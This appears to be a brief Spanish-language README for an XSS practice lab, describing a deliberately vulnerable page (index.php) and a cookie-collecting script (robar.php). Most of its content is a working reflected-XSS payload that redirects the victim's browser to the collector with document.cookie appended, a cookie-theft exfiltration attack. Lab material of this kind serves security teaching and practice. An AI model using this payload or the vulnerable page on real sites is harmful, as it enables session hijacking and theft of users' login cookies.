**index.php** levanta una web vulnerable ante ataques xss reflejados.

**robar.php** recibe las cookies del usuario.

## Payload
<code><script>document.location='http://localhost:8080/robar.php?cookie='+document.cookie</script></code>

